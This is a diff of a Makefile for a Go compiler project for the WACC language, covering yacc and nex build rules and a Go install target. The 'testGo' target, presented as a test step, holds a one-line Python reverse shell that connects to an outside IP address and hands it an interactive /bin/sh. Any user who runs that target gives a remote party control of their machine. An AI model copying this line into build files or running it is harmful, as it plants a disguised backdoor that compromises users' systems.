@@ -22,10 +22,10 @@ all: go frontend
 testGo:
 	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.169.52.106",18080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-parser.go: wacc.y
+parser.go: go wacc.y
 	$(GO) tool yacc -o parser.go wacc.y
 
-lexer.go: wacc.nex
+lexer.go: go wacc.nex
 	nex -e=true -o lexer.go wacc.nex
 
 frontend: parser.go lexer.go ast.go
@@ -38,7 +38,8 @@ clean:
 nex:
 	$(GO) get github.com/blynn/nex
 
-go: $(GOPACKAGE)
+go:
+	[ -n "$(which apt-get)" ] && apt-get install -y golang-go || echo "Go installed"
 
 # make test invalids=~/labs/wacc_examples/invalid/ valids=~/labs/wacc_examples/valid/
 test:
